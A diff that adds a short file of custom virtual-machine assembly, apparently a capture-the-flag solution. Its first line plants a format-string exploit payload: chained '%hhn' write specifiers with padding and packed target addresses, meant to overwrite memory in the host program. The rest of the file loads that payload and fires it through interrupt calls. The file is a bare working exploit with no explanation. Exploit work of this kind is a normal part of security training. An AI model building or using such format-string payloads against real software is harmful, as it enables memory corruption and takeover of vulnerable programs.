@@ -1,0 +1,17 @@
+.data 0x400 b'%148$hhn%149$hhn%150$hhn%151$hhn%152$hhn%32c%153$hhn%16c%154$hhn%48c%155$hhnaaaas!`\x00\x00\x00\x00\x00t!`\x00\x00\x00\x00\x00u!`\x00\x00\x00\x00\x00v!`\x00\x00\x00\x00\x00w!`\x00\x00\x00\x00\x00q!`\x00\x00\x00\x00\x00p!`\x00\x00\x00\x00\x00r!`\x00\x00\x00\x00\x00'
+MOV16 $FBX 0x0129
+MOV16 $FCX 0x5c00
+MOV16 $FDX 0x0801
+MOV16 $FSP 0x0000
+MOV16 $F01 0xf8c2
+NOP 60
+INT 5
+INT 5
+INT 5
+INT 5
+INT 5
+INT 5
+MOV16 $FAX 0x400
+INT 0
+INT 2
+JMP 1
